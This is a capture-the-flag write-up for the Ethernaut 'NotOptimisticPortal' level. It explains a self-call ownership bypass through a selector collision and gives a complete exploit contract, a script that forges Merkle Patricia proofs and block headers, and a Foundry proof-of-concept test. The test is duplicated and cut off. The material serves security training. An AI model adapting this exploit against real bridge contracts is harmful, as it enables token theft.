# Ethernaut - Level 40: NotOptimisticPortal solution - HackMD

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Introduction "Introduction")Introduction

This level is quite difficult because:

1.  It requires very careful attention to detail.
2.  You need to create and understand a relatively complex script to generate Merkle Patricia proofs.

However, the attack itself is fairly easy to explain. Before diving into it, we need to review a few key concepts:

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Function-selectors "Function-selectors")Function selectors

Computers don’t understand words, they only understand bytes. When a function is declared in Solidity, its signature is hashed and the first 4 bytes of that hash become the function selector used in calldata.

Four bytes (32 bits) are not enough to uniquely represent every function name in the world, but they are sufficient to uniquely identify up to functions per contract as long as no two declared functions compile to the same selector.

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Require-Background "Require-Background")Require Background

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Data-structures "Data-structures")Data structures

You must understand the following structures to solve the CTF:

-   [PATRICIA trie](https://medium.com/@aatreyimehta1/patricia-trie-85c65d5d206c): a compressed radix trie used for efficient key storage.
-   [Merkle Tree](https://www.youtube.com/watch?v=s7C2KjZ9n2U): hash-based structure for inclusion proofs.
-   [Merkle Patricia trie](https://www.youtube.com/watch?v=DGvRY9BjLRs): Ethereum’s hybrid structure combining both concepts.

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Recursive-Length-Prefix-RLP-serialization "Recursive-Length-Prefix-RLP-serialization")[Recursive Length Prefix (RLP) serialization](https://ethereum.org/developers/docs/data-structures-and-encoding/rlp/)

It is a compact data encoding used for block headers

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#What-are-L2 "What-are-L2")What are L2?

Definitions vary slightly across sources:

-   _A layer 2 refers to any off-chain network, system, or technology built on top of a blockchain (a layer 1) to extend its capabilities._ - [Chainlink](https://chain.link/education-hub/what-is-layer-2)
-   _Layer 2 is a scaling solution that enables high throughput while inheriting the security of the underlying blockchain._ - [CoinMarketCap](https://coinmarketcap.com/academy/glossary/layer-2)
-   _Layer 2 is a second network built on top of Ethereum, preserving Ethereum’s security and decentralization guarantees._ - [Uniswap](https://support.uniswap.org/hc/en-us/articles/7424975828749-What-is-a-Layer-2-Network)

All of these are true, but very few articles clearly explain what an L2 technically is and how it interacts with L1. Here my best shot give a simple definition:

_An L2 is a blockchain that periodically posts a hash (usually a Merkle root) to an L1. That hash commits to the state of the L2. As long as the L2 stays consistent with what it has published on L1, it inherits L1 security. If it deviates, anyone can verify the discrepancy and the system loses trust._

In this CTF, the merkle roots of the L2 are stored in `l2StateRoots`

#### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Sequencer-in-L2 "Sequencer-in-L2")Sequencer in L2

A Sequencer determines transaction ordering and publishes valid blocks to L1 by submitting the Merkle root that commits to them.

#### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Communication-between-L1-and-L2 "Communication-between-L1-and-L2")Communication between L1 and L2

Users can trigger L1 → L2 messages by interacting with specific L1 contracts. Meanwhile, L2 → L1 communication is typically handled by the Sequencer.

Most L2s provide an alternative path for users: submitting a "forced transaction" that the Sequencer must include after certain conditions (e.g., a timeout). In this CTF, this behavior is emulated by `sendMessage`.

Messages coming from L2 to L1 are handled by `executeMessage`.

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Identifying-the-Attack-Surface "Identifying-the-Attack-Surface")Identifying the Attack Surface

There are four relevant actors/roles:

-   **Governance**: Can call `governanceAction_____2357862414`, but its address is immutable, so is nonsense to modify it.
-   **Owner**: Can call `updateSequencer_____76439298743` and `transferOwnership_____610165642`. If we are able to become the owner we can also become the sequencer
-   **Sequencer**: Can call `submitNewBlock_____37278985983`. If we can take control of it we can setup any block
-   **Normal users**: Can call `executeMessage` and `sendMessage`. This functions will be our main entrypoints (our attack is highly likely to be triggered by using these functions)

One interesting point is the onlyOwner modifier:

```solidity
    // Governance must be able to transfer portal ownership
    modifier onlyOwner() {
        require(
            msg.sender == owner || 
            msg.sender == address(this), 
            "Caller not owner");
        _;
    }
```

Its intention is to allow governance-triggered calls through `governanceAction_____2357862414`, but it unintentionally allows the contract to call itself and bypass ownership checks.

If we can make the contract call itself during executeMessage, we can call `transferOwnership_____610165642`, become the owner, then call `updateSequencer_____76439298743` (becoming the sequencer) and finally `submitNewBlock_____37278985983` to overwrite any L2 state root, enabling unauthorized withdrawals.

We must now ask:  
_Is there any way for the contract to call itself?_

We must also recall our goal: minting tokens. So… where in the codebase is a mint call?

```solidity
    function executeMessage(
        address _tokenReceiver,
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageData,
        uint256 _salt,
        ProofData calldata _proofs,
        uint16 _bufferIndex
    ) external nonReentrant {

        // Idea: compress information that should have already been submited by sequencer to just a hash
        bytes32 withdrawalHash = _computeMessageSlot(
            _tokenReceiver,
            _amount,
            _messageReceivers,
            _messageData,
            _salt
        );

        // assure msg has not been executed yet
        require(!executedMessages[withdrawalHash], "Message already executed");
        require(_messageReceivers.length == _messageData.length, "Message execution data arrays mismatch");

        // Call to each receiver
        for(uint256 i; i < _messageData.length; i++){
            // @audit will make call to any receiver specify by user
            // @audit even calls to this contract
            _executeOperation(
                _messageReceivers[i], 
                _messageData[i], 
                false // Not governance action
            );
        }

        _verifyMessageInclusion(
            withdrawalHash, // @audit result of inputs
            _proofs.stateTrieProof,
            _proofs.storageTrieProof,
            _proofs.accountStateRlp,
            _bufferIndex // although controlled by user, must make reference to a valid  L2 state roots
        );


        // @audit flag message as executed
        executedMessages[withdrawalHash] = true;

        // @audit We need to trigger this
        if(_amount != 0){
            _mint(_tokenReceiver, _amount);
        }

        //...
    }
	
	function _executeOperation(
		address target,
		bytes calldata callData,
		bool isGovernanceAction
	) internal {
		if(!isGovernanceAction){
			// Ensure the execution is the onMessageReceived(bytes) entrypoint on the target address
			require(bytes4(callData[0:4]) == bytes4(0x3a69197e), "Invalid message entrypoint");
		}
		
		// Idea: We can call any target as long as the entrypoint is onMessageReceived or we are executing a governance action
		(bool success, ) = target.call(callData);
		require(success, "Execution failed");
	}
```

Nothing prevents the contract from calling itself through `_executeOperation` as long as:

1.  The target function is not protected by a `nonReentrant` modifier, and
2.  We are either the governance (which is impossible) **OR** there exists a function in the contract with selector `0x3a69197e`.

Surprisingly, this is exactly the case:

-   The selector for `onMessageReceived(bytes)` is `0x3a69197e`, even though this function does not exist in the contract.
-   The selector for `transferOwnership_____610165642(address)` is also `0x3a69197e`.

Therefore, we can call this function via `_executeOperation` and seize ownership of the contract (`onlyOwner` will not revert because `msg.sender == address(this)`).

Once we take ownership, we can also promote ourselves to sequencer, which allows us to submit arbitrary L2 state roots to the contract through `submitNewBlock_____37278985983(bytes)`.

Now, let me pause here for a moment, because you might reasonably ask:

**Why on ~fucking~ earth would I check if some function selector coincidentally matches the call being made??? Who does that in a real audit???**

The question is completely valid. And here’s the answer:  
**You are not literally checking for selector collisions.**  
**You are thinking: _Is there any way to take ownership of the contract?_**

This line of thinking leads you to notice that the **onlyOwner** modifier can be bypassed when the call originates from `NotOptimisticPortal` itself. From there, you realize nothing prevents you from specifying the contract itself as a call target inside `executeMessage`. Finally, you discover that the attack is only possible if—and only if—the contract contains a function with selector `0x3a69197e`, which happens to be the same selector used in the ownership transfer function.

You could phrase the initial question differently, for example:

_Is there any way for the contract to call updateSequencer\_\_\_\_\_76439298743 on itself, become the sequencer, and then use submitNewBlock\_\_\_\_\_37278985983 to write any L2 state root?_

The key takeaway is: **Be optimistic about potential vulnerabilities until you have proven they are impossible to trigger**.

Now that we can submit any L2 state root, what should we write into it?

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Looking-for-the-attack "Looking-for-the-attack")Looking for the attack

We know that the only way to mint tokens is through `executeMessage`. We also know the following:

1.  The function inputs are compressed into a hash called `withdrawalHash`
2.  `withdrawalHash` must not have been used before, due to `executedMessages[withdrawalHash]` check.
3.  Each receiver must have associated calldata because of the `_messageReceivers.length == _messageData.length` check.
4.  Every call made must target a function with selector `0x3a69197e`. This allows us to seize contract ownership and then call a custom contract we deploy that implements an `onMessageReceived(bytes)` function, which will:
    1.  Call `updateSequencer_____76439298743`, and
    2.  Call `submitNewBlock_____37278985983`, though we still don’t yet know the exact data to include.
5.  We must attach valid proofs to satisfy the checks inside `_verifyMessageInclusion`. This function performs two important validations:
    1.  It checks inclusion of `{ key: L2_TARGET, value: accountStateRlp }` in the Merkle Patricia Trie whose root is submitted by the sequencer.
    2.  It checks inclusion of `{ key: withdrawalHash, value: 0x01 }` in the storage trie defined by `accountStateRlp.storageRoot`.
6.  Once these checks pass, the contract mints the requested tokens.

To attack this contract, we need to compute the correct `withdrawalHash` so that we can generate a valid Merkle Patricia Trie root. Its value depends on:

1.  `_tokenReceiver`: the account that will receive the tokens. Let’s call it ATTACKER.
2.  `_amount`: the amount of tokens to mint.
3.  `_messageReceivers`: the contracts invoked during `executeMessage`:
    1.  `NotOptimisticPortal` to call `transferOwnership_____610165642`,
    2.  `CallbackExploiter`: a contract we deploy that will receive ownership of `NotOptimisticPortal` and implement the `onMessageReceived` callback. Inside this callback we will:
        1.  Call `updateSequencer_____76439298743` to become the sequencer, and
        2.  Call `submitNewBlock_____37278985983` to write the forged L2 state root needed for the exploit.
4.  `_messageDatas`:
    1.  Calldata for `transferOwnership_____610165642`,
    2.  Calldata for `onMessageReceived`.
5.  `_salt`: we simply set this to 0.

Since `CallbackExploiter` is not deployed yet, that is the first step. After deploying it, we can compute the desired `withdrawalHash` for: `{_tokenReceiver: ATTACKER, _amount: 1 ether, _messageReceivers: [NotOptimisticPortal,CallbackExploiter],_messageDatas: [transferOwnership_____610165642,onMessageReceived], salt: 0}`

With this data, we can use `_computeMessageSlot` to calculate the withdrawal slot. We must also keep in mind that the L2 state root we submit must follow these constraints:

1.  It must reference `latestBlockHash`.
2.  It must encode `latestBlockNumber + 1`.
3.  Its timestamp must be greater than `latestBlockTimestamp`.

Once this L2 state root is submitted, the attack succeeds. Now that we understand what needs to be done, we can move on to how we do it.

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Attacking "Attacking")Attacking

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#CallbackExploiter-contract "CallbackExploiter-contract")`CallbackExploiter` contract

First thing we must do is deploying the `CallbackExploiter`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {INotOptimisticPortal} from "./INotOptimisticPortal.sol";
import {IMessageReceiver} from "./NotOptimisticPortal.sol";
import {NotOptimisticPortal} from "./NotOptimisticPortal.sol";
import {Ownable} from "openzeppelin-contracts-v5.4.0/access/Ownable.sol";
import {console} from "forge-std/console.sol";


contract CallbackExploiter is IMessageReceiver, Ownable{
    NotOptimisticPortal public portal;
    address public immutable ATTACKER;
    uint256 constant AMOUNT_TO_RECEIVE = 1 ether;
    uint256 bufferIndex;
    bytes rlpBlockHeader;

    constructor(address _portal) Ownable(msg.sender) {
        portal = NotOptimisticPortal(_portal);
        ATTACKER = msg.sender;
    }


    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    function exploit(NotOptimisticPortal.ProofData memory proofs) external {
        // Encode transferOwnership call
        // Reasoning: Shares same selector than onMessageReceived
        // Goal: Getting ownership
        bytes memory transferOwnershipEncodedCall = abi.encodeCall(
            INotOptimisticPortal.transferOwnership_____610165642,
            (address(this))
        );

        // Trigger custom call back
        bytes memory onMessageReceivedEncodedCall = abi.encodeCall(
            CallbackExploiter.onMessageReceived,
            (bytes(""))
        );

        bytes[] memory receiversData = new bytes[](2);
        address[] memory receivers = new address[](2);
        
        receivers[0] = address(portal); // first call will be to portal, exploiting CEI / weak ownership control
        receivers[1] = address(this); // second call to transferOwnership

        receiversData[0] = transferOwnershipEncodedCall;
        receiversData[1] = onMessageReceivedEncodedCall;


        bytes32 storageSlotToByPass = computeMessageSlot(
            ATTACKER,
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0 // salt
        );

        console.log("Storage slot");
        console.logBytes32(storageSlotToByPass);

        portal.executeMessage(
            ATTACKER,
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0, //salt
            proofs,
            uint16(bufferIndex)
        );
    }

    function computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) public pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;

        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length - 1; i++){
                messageReceiversAccumulatedHash = keccak256(
                    abi.encode(
                        messageReceiversAccumulatedHash, 
                        _messageReceivers[i])
                    );
                messageDatasAccumulatedHash = keccak256(
                    abi.encode(
                        messageDatasAccumulatedHash, 
                        _messageDatas[i]
                        )
                    );
            }
        }

        // Slot that hold message processing info?
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt // manipulate just salt
        ));
    }

    function onMessageReceived(bytes memory ) external override {
        // Callback where magic happens
        // By now this address is portal owner

        // First console log that we earn ownership of smart contract
        address portalOwner = portal.owner();
        require(portalOwner == address(this), "exploit failed");

        // we can impersonate sequencer
        portal.updateSequencer_____76439298743(address(this));
        address portalSequencer = portal.sequencer();
        require(portalSequencer == address(this), "exploit failed");

        

        // by impersonating sequencer we can submit a new block
        portal.submitNewBlock_____37278985983(
            rlpBlockHeader
        );

    }

    function setPortal(address _portal) external {
        portal = NotOptimisticPortal(_portal);
    }

    function setBufferIndex(uint256 _index) external onlyOwner {
        bufferIndex = _index;
    }

    function setRLPBlockHeader(bytes memory _rlpBlockHeader) external onlyOwner {
        rlpBlockHeader = _rlpBlockHeader;
    }
}
```

With this contract we can compute `withdrawalHash` through `computeMessageSlot` and store its value in an environment variable `WITHDRAWAL_SLOT`. The `latestBlockHash`, `latestBlockNumber`, and `latestBlockTimestamp` can be queried directly from `NotOptimisticPortal`. At that point, we have all the parameters needed to calculate the L2 state root required to perform the attack.

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Generate-L2-state-root-and-proof "Generate-L2-state-root-and-proof")Generate L2 state root and proof

Through some vibe coding, the following script was created to generate all the data we need.

```javascript
import { Trie } from '@ethereumjs/trie';
import { RLP } from '@ethereumjs/rlp';
import { keccak256 } from 'ethereum-cryptography/keccak';
import { hexToBytes, bytesToHex, concatBytes } from 'ethereum-cryptography/utils';
import dotenv from 'dotenv';

dotenv.config();
// Constants
const L2_TARGET = '0x4242424242424242424242424242424242424242';
const POSTED_PARENT_HASH = process.env.POSTED_PARENT_HASH || '0xed20f024a9b5b75b1dd37fe6c96b829ed766d78103b3ab8f442f3b2ebbc557b9';
const POSTED_BLOCK_NUMBER = process.env.POSTED_BLOCK_NUMBER ? parseInt(process.env.POSTED_BLOCK_NUMBER) : 60806040 ;
const POSTED_BLOCK_TIMESTAMP = process.env.POSTED_BLOCK_TIMESTAMP ? parseInt(process.env.POSTED_BLOCK_TIMESTAMP) + 10: 1606824023;
const NEW_MESSAGE_SLOT = process.env.WITHDRAWAL_SLOT;

// Helper function to convert address to bytes
function addressToBytes(address: string): Uint8Array {
  return hexToBytes(address.toLowerCase().replace('0x', ''));
}

// Helper function to pad bytes32
function padBytes32(value: Uint8Array): Uint8Array {
  const padded = new Uint8Array(32);
  padded.set(value, 32 - value.length);
  return padded;
}

// Compute storage key hash (same as Ethereum's keccak256(key))
function computeStorageKey(slot: string): Uint8Array {
  const slotBytes = hexToBytes(slot.replace('0x', ''));
  return keccak256(padBytes32(slotBytes));
}

// Compute account key hash (keccak256 of address)
function computeAccountKey(address: string): Uint8Array {
  return keccak256(addressToBytes(address));
}

// RLP encode account state [nonce, balance, storageRoot, codeHash]
function encodeAccountState(
  nonce: number,
  balance: bigint,
  storageRoot: Uint8Array,
  codeHash: Uint8Array
): Uint8Array {
  const encoded = RLP.encode([
    nonce === 0 ? new Uint8Array() : nonce,
    balance === 0n ? new Uint8Array() : `0x${balance.toString(16)}`,
    storageRoot,
    codeHash
  ]);
  return encoded;
}

// RLP encode block header
function encodeBlockHeader(
  parentHash: string,
  ommersHash: string,
  beneficiary: string,
  stateRoot: Uint8Array,
  transactionsRoot: string,
  receiptsRoot: string,
  logsBloom: string,
  difficulty: number,
  number: number,
  gasLimit: number,
  gasUsed: number,
  timestamp: number,
  extraData: string,
  mixHash: string,
  nonce: string
): Uint8Array {
  const header = [
    hexToBytes(parentHash.replace('0x', '')),
    hexToBytes(ommersHash.replace('0x', '')),
    hexToBytes(beneficiary.replace('0x', '')),
    stateRoot,
    hexToBytes(transactionsRoot.replace('0x', '')),
    hexToBytes(receiptsRoot.replace('0x', '')),
    hexToBytes(logsBloom.replace('0x', '')),
    difficulty === 0 ? new Uint8Array() : difficulty,
    number,
    gasLimit,
    gasUsed,
    timestamp,
    hexToBytes(extraData.replace('0x', '')),
    hexToBytes(mixHash.replace('0x', '')),
    hexToBytes(nonce.replace('0x', ''))
  ];
  
  return RLP.encode(header);
}

async function generateProofs() {
  console.log('=== Generating Merkle Proofs ===\n');

  // Step 1: Create storage trie with a single entry
  const storageTrie = new Trie();
  
  // This is the message slot we want to prove exists
  const messageSlot = NEW_MESSAGE_SLOT;
  const storageKey = computeStorageKey(messageSlot as string);
  const storageValue = RLP.encode(1); // Value is 0x01
  
  await storageTrie.put(storageKey, storageValue);
  const storageRoot = storageTrie.root();
  
  console.log('Storage Trie Root:', bytesToHex(storageRoot));
  console.log('Message Slot:', messageSlot);
  console.log('Storage Key (hashed):', bytesToHex(storageKey));
  
  // Generate storage proof
  const storageProof = await storageTrie.createProof(storageKey);
  const storageProofRlp = RLP.encode(storageProof);
  
  console.log('Storage Proof:', bytesToHex(storageProofRlp));
  console.log('Storage Proof Length:', storageProof.length, 'nodes\n');

  // Step 2: Create account state
  const emptyCodeHash = keccak256(new Uint8Array());
  const accountStateRlp = encodeAccountState(
    0,           // nonce
    0n,          // balance
    storageRoot, // storageRoot from storage trie
    emptyCodeHash // codeHash for empty code
  );
  
  console.log('Account State RLP:', bytesToHex(accountStateRlp));
  console.log('Empty Code Hash:', bytesToHex(emptyCodeHash), '\n');

  // Step 3: Create state trie with the account
  const stateTrie = new Trie();
  const accountKey = computeAccountKey(L2_TARGET);
  
  await stateTrie.put(accountKey, accountStateRlp);
  const stateRoot = stateTrie.root();
  
  console.log('State Trie Root:', bytesToHex(stateRoot));
  console.log('L2 Target Address:', L2_TARGET);
  console.log('Account Key (hashed):', bytesToHex(accountKey));
  
  // Generate state proof
  const stateProof = await stateTrie.createProof(accountKey);
  const stateProofRlp = RLP.encode(stateProof);
  
  console.log('State Proof:', bytesToHex(stateProofRlp));
  console.log('State Proof Length:', stateProof.length, 'nodes\n');

  // Step 4: Create block header
  const blockNumber = POSTED_BLOCK_NUMBER + 1;
  const timestamp = POSTED_BLOCK_TIMESTAMP + 1;
  const parentHash = POSTED_PARENT_HASH;
  
  const blockHeaderRlp = encodeBlockHeader(
    parentHash,
    '0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347', // empty ommers hash
    '0x0000000000000000000000000000000000000000', // beneficiary
    stateRoot,
    '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421', // empty transactions root
    '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421', // empty receipts root
    '0x' + '0'.repeat(512), // empty logs bloom
    0, // difficulty
    blockNumber,
    30000000, // gas limit
    0, // gas used
    timestamp,
    '0x', // extra data
    '0x0000000000000000000000000000000000000000000000000000000000000000', // mix hash
    '0x0000000000000000000000' // nonce (8 bytes)
  );
  
  const blockHash = keccak256(blockHeaderRlp);
  
  console.log('=== Block Header ===');
  console.log('Block Number:', blockNumber);
  console.log('Timestamp:', timestamp);
  console.log('Parent Hash:', parentHash);
  console.log('Block Header RLP:', bytesToHex(blockHeaderRlp));
  console.log('Block Hash:', bytesToHex(blockHash), '\n');

  // Step 5: Output contract call data
  console.log('=== Contract Call Parameters ===');
  console.log('messageSlot:', messageSlot);
  console.log('stateTrieProof:', bytesToHex(stateProofRlp));
  console.log('storageTrieProof:', bytesToHex(storageProofRlp));
  console.log('accountStateRlp:', bytesToHex(accountStateRlp));
  console.log('bufferIndex: 0 (or current buffer index)');
  console.log('\nBlock Header for constructor/submitNewBlock:', bytesToHex(blockHeaderRlp));

  // Verification
  console.log('\n=== Verification ===');
  console.log('✓ Storage trie contains message slot');
  console.log('✓ Account state contains storage root');
  console.log('✓ State trie contains account at L2_TARGET');
  console.log('✓ Block header contains state root');
  
  return {
    messageSlot,
    stateTrieProof: bytesToHex(stateProofRlp),
    storageTrieProof: bytesToHex(storageProofRlp),
    accountStateRlp: bytesToHex(accountStateRlp),
    blockHeaderRlp: bytesToHex(blockHeaderRlp),
    stateRoot: bytesToHex(stateRoot),
    storageRoot: bytesToHex(storageRoot),
    blockHash: bytesToHex(blockHash),
    blockNumber,
    timestamp
  };
}

// Run the generator
generateProofs()
  .then(result => {
    console.log('\n=== Generation Complete ===');
    console.log('Use these values in your Solidity tests!');
  })
  .catch(err => {
    console.error('Error generating proofs:', err);
    process.exit(1);
  });
```

Through it, we generate:

-   `stateTrieProof`
-   `storageTrieProof`
-   `accountStateRlp`
-   RLP block header

Now we have everything required to perform the attack — we simply need to write the script.

### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Coded-POC "Coded-POC")Coded POC

#### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Local-test "Local-test")Local test

We first need the RLP block header for the initial block. Then we generate the proof and the RLP header that will be submitted during the attack.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {NotOptimisticPortal} from "../src/not-optimistic-portal/NotOptimisticPortal.sol";
import {CallbackExploiter} from "../src/not-optimistic-portal/CallbackExploiter.sol";    
import {Strings} from "openzeppelin-contracts-v5.4.0/utils/Strings.sol";

contract NotOptimisticPortalTest is Test {
    using Strings for *;
    NotOptimisticPortal portal;
    CallbackExploiter exploiterCallback;
    address constant ATTACKER = vm.envAddress("RECEIVER_ACCOUNT");
    uint256 constant AMOUNT_TO_RECEIVE = 100 ether;
    address GOVERNANCE_TEST = makeAddr("governance");


    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    function setUp() public {
        // Calculate an empty RLP encoded block header
        bytes memory encodedBytesRLP = vm.envBytes("EMPTY_RLP_BLOCK_HEADER");

        // local
        portal = new NotOptimisticPortal(
            "PortalToken",
            "PORTAL",
            encodedBytesRLP,
            GOVERNANCE_TEST
        );

        uint256 bufferCounterMinusOne = portal.bufferCounter() - 1;
        // console.log("FIRST BLOCK HASH: %s",  abi.encodePacked(portal.latestBlockHash()));
        console.log("BUFFER COUNTER %d", portal.bufferCounter());

        bytes32 encodedRoot =  bytes32(abi.encodePacked(portal.l2StateRoots(bufferCounterMinusOne)));
        console.log("ROOTS[ %d ] : %s", bufferCounterMinusOne, Strings.toHexString(uint256(encodedRoot), 32));
        console.log("LATEST BLOCK NUMBER: %d", portal.latestBlockNumber());
        console.log("FIRST BLOCK TIMESTAMP: %d", portal.latestBlockTimestamp());
        


        exploiterCallback = new CallbackExploiter(address(portal));
    }

    function testExploit() public {
        // Your test code here
        address[] memory receivers = new address[](2);
        
        bytes memory onMessageReceived = abi.encodeCall(
            CallbackExploiter.onMessageReceived,
            (bytes(""))
        );

        bytes memory transferOwnershipEncodedCall = abi.encodeCall(
            NotOptimisticPortal.transferOwnership_____610165642,
            (address(exploiterCallback))
        );

        bytes[] memory receiversData = new bytes[](2);
        receiversData[0] = transferOwnershipEncodedCall;
        receiversData[1] = onMessageReceived;
        receivers[0] = address(portal);
        receivers[1] = address(exploiterCallback);
        

        bytes32 slotComputed = _computeMessageSlot(
            ATTACKER,
            AMOUNT_TO_RECEIVE, // 1 wei
            receivers,
            receiversData,
            0 // salt
        );

        console.log("WITHDRAWAL SLOT: ", Strings.toHexString(uint256(slotComputed), 32));
        bytes32 slotValueBeforeAttack = vm.load(
            address(portal),
            slotComputed
        );

        NotOptimisticPortal.ProofData memory proofs;

        proofs.stateTrieProof = vm.envBytes("STATE_TRIE_PROOF_TEST");
        proofs.storageTrieProof = vm.envBytes("STORAGE_TRIE_PROOF_TEST");
        proofs.accountStateRlp = vm.envBytes("ACCOUNT_STATE_RLP_TEST");
        bytes memory rlpBlockHeader = vm.envBytes("RLP_BLOCK_HEADER_TEST");

        exploiterCallback.setRLPBlockHeader(rlpBlockHeader);

        
        portal.executeMessage(
            ATTACKER,
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0,
            proofs,
            1
        );
        
        
        require(portal.balanceOf(ATTACKER) > 0, "Attacker still without tokens");
        require(portal.executedMessages(slotComputed), "Slot was not overwritten");
    }

    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) internal pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;

        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length - 1; i++){
                messageReceiversAccumulatedHash = keccak256(
                    abi.encode(
                        messageReceiversAccumulatedHash, 
                        _messageReceivers[i])
                    );
                messageDatasAccumulatedHash = keccak256(
                    abi.encode(
                        messageDatasAccumulatedHash, 
                        _messageDatas[i]
                        )
                    );
            }
        }

        // Slot that hold message processing info?
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt // manipulate just salt
        ));
    }
}// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {NotOptimisticPortal} from "../src/not-optimistic-portal/NotOptimisticPortal.sol";
import {CallbackExploiter} from "../src/not-optimistic-portal/CallbackExploiter.sol";    
import {Strings} from "openzeppelin-contracts-v5.4.0/utils/Strings.sol";

contract NotOptimisticPortalTest is Test {
    using Strings for *;
    NotOptimisticPortal portal;
    CallbackExploiter exploiterCallback;
    address constant ATTACKER = vm.envAddress("RECEIVER_ACCOUNT");
    uint256 constant AMOUNT_TO_RECEIVE = 100 ether;
    address GOVERNANCE_TEST = makeAddr("governance");


    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    function setUp() public {
        // Calculate an empty RLP encoded block header
        bytes memory encodedBytesRLP = vm.envBytes("EMPTY_RLP_BLOCK_HEADER");

        // local
        portal = new NotOptimisticPortal(
            "PortalToken",
            "PORTAL",
            encodedBytesRLP,
            GOVERNANCE_TEST
        );

        uint256 bufferCounterMinusOne = portal.bufferCounter() - 1;
        // console.log("FIRST BLOCK HASH: %s",  abi.encodePacked(portal.latestBlockHash()));
        console.log("BUFFER COUNTER %d", portal.bufferCounter());

        bytes32 encodedRoot =  bytes32(abi.encodePacked(portal.l2StateRoots(bufferCounterMinusOne)));
        console.log("ROOTS[ %d ] : %s", bufferCounterMinusOne, Strings.toHexString(uint256(encodedRoot), 32));
        console.log("LATEST BLOCK NUMBER: %d", portal.latestBlockNumber());
        console.log("FIRST BLOCK TIMESTAMP: %d", portal.latestBlockTimestamp());
        


        exploiterCallback = new CallbackExploiter(address(portal));
    }

    function testExploit() public {
        // Your test code here
        address[] memory receivers = new address[](2);
        
        bytes memory onMessageReceived = abi.encodeCall(
            CallbackExploiter.onMessageReceived,
            (bytes(""))
        );

        bytes memory transferOwnershipEncodedCall = abi.encodeCall(
            NotOptimisticPortal.transferOwnership_____610165642,
            (address(exploiterCallback))
        );

        bytes[] memory receiversData = new bytes[](2);
        receiversData[0] = transferOwnershipEncodedCall;
        receiversData[1] = onMessageReceived;
        receivers[0] = address(portal);
        receivers[1] = address(exploiterCallback);
        

        bytes32 slotComputed = _computeMessageSlot(
            ATTACKER,
            AMOUNT_TO_RECEIVE, // 1 wei
            receivers,
            receiversData,
            0 // salt
        );

        console.log("WITHDRAWAL SLOT: ", Strings.toHexString(uint256(slotComputed), 32));
        bytes32 slotValueBeforeAttack = vm.load(
            address(portal),
            slotComputed
        );

        NotOptimisticPortal.ProofData memory proofs;

        proofs.stateTrieProof = vm.envBytes("STATE_TRIE_PROOF_TEST");
        proofs.storageTrieProof = vm.envBytes("STORAGE_TRIE_PROOF_TEST");
        proofs.accountStateRlp = vm.envBytes("ACCOUNT_STATE_RLP_TEST");
        bytes memory rlpBlockHeader = vm.envBytes("RLP_BLOCK_HEADER_TEST");

        exploiterCallback.setRLPBlockHeader(rlpBlockHeader);

        
        portal.executeMessage(
            ATTACKER,
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0,
            proofs,
            1
        );
        
        
        require(portal.balanceOf(ATTACKER) > 0, "Attacker still without tokens");
        require(portal.executedMessages(slotComputed), "Slot was not overwritten");
    }

    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) internal pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;

        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length - 1; i++){
                messageReceiversAccumulatedHash = keccak256(
                    abi.encode(
                        messageReceiversAccumulatedHash, 
                        _messageReceivers[i])
                    );
                messageDatasAccumulatedHash = keccak256(
                    abi.encode(
                        messageDatasAccumulatedHash, 
                        _messageDatas[i]
                        )
                    );
            }
        }

        // Slot that hold message processing info?
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
